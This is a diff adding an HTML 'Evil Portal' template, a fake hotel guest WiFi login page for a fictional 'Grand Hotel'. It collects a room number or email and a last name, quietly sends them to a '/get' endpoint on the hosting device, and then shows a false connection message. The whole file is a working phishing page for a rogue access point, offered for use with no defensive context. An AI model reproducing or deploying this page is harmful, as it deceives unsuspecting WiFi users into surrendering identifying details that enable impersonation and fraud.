@@ -1,0 +1,207 @@
+<!--
+  Evil Portal Template: Hotel Guest WiFi
+  
+  Elegant hotel-style portal with room number authentication.
+  
+  Form fields:
+  - email: Room number or email (flexible)
+  - password: Last name
+-->
+<!DOCTYPE html>
+<html>
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <title>Hotel Guest WiFi</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Georgia', 'Times New Roman', serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: linear-gradient(180deg, #ffffff 0%, #f8f9fa 100%);
+            padding: 0;
+            border-radius: 4px;
+            box-shadow: 0 25px 80px rgba(0,0,0,0.5);
+            width: 100%;
+            max-width: 420px;
+            overflow: hidden;
+        }
+        .header {
+            background: linear-gradient(135deg, #c9a227 0%, #d4af37 50%, #c9a227 100%);
+            padding: 30px 20px;
+            text-align: center;
+        }
+        .hotel-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .hotel-name {
+            font-size: 24px;
+            font-weight: normal;
+            color: #1a1a2e;
+            letter-spacing: 3px;
+            text-transform: uppercase;
+        }
+        .hotel-tagline {
+            font-size: 12px;
+            color: #333;
+            margin-top: 5px;
+            font-style: italic;
+        }
+        .body {
+            padding: 30px 25px;
+        }
+        .welcome {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .welcome h2 {
+            font-size: 20px;
+            color: #1a1a2e;
+            font-weight: normal;
+            margin-bottom: 8px;
+        }
+        .welcome p {
+            font-size: 14px;
+            color: #666;
+            font-family: -apple-system, sans-serif;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-size: 12px;
+            color: #1a1a2e;
+            margin-bottom: 8px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            font-family: -apple-system, sans-serif;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            font-size: 16px;
+            font-family: -apple-system, sans-serif;
+            transition: border-color 0.3s;
+        }
+        input:focus {
+            outline: none;
+            border-color: #d4af37;
+        }
+        button {
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #d4af37;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: -apple-system, sans-serif;
+        }
+        button:hover {
+            background: linear-gradient(135deg, #0f3460 0%, #1a1a2e 100%);
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            background: #f8f9fa;
+            border-top: 1px solid #eee;
+        }
+        .footer p {
+            font-size: 11px;
+            color: #999;
+            font-family: -apple-system, sans-serif;
+        }
+        .success {
+            display: none;
+            text-align: center;
+            padding: 40px 20px;
+        }
+        .success.show { display: block; }
+        .success-icon {
+            font-size: 60px;
+            color: #d4af37;
+            margin-bottom: 20px;
+        }
+        .success h3 {
+            color: #1a1a2e;
+            font-size: 22px;
+            font-weight: normal;
+            margin-bottom: 10px;
+        }
+        .success p {
+            color: #666;
+            font-size: 14px;
+            font-family: -apple-system, sans-serif;
+        }
+        .form-container.hide { display: none; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="hotel-icon">🏨</div>
+            <div class="hotel-name">Grand Hotel</div>
+            <div class="hotel-tagline">Luxury & Comfort Since 1920</div>
+        </div>
+        
+        <div class="form-container" id="formContainer">
+            <div class="body">
+                <div class="welcome">
+                    <h2>Welcome, Guest</h2>
+                    <p>Please enter your details to connect to our complimentary WiFi</p>
+                </div>
+                
+                <form id="loginForm">
+                    <div class="form-group">
+                        <label>Room Number or Email</label>
+                        <input type="text" name="email" placeholder="e.g. 402 or guest@email.com" required>
+                    </div>
+                    <div class="form-group">
+                        <label>Last Name</label>
+                        <input type="text" name="password" placeholder="As registered at check-in" required>
+                    </div>
+                    <button type="submit">Connect to WiFi</button>
+                </form>
+            </div>
+            
+            <div class="footer">
+                <p>Need assistance? Contact our front desk at extension 0</p>
+            </div>
+        </div>
+        
+        <div class="success" id="successMsg">
+            <div class="success-icon">✦</div>
+            <h3>Welcome to Grand Hotel WiFi</h3>
+            <p>You are now connected. Enjoy your stay.</p>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            var formData = new FormData(this);
+            var params = new URLSearchParams(formData).toString();
+            var img = new Image();
+            img.src = '/get?' + params;
+            document.getElementById('formContainer').classList.add('hide');
+            document.getElementById('successMsg').classList.add('show');
+        });
+    </script>
+</body>
+</html>
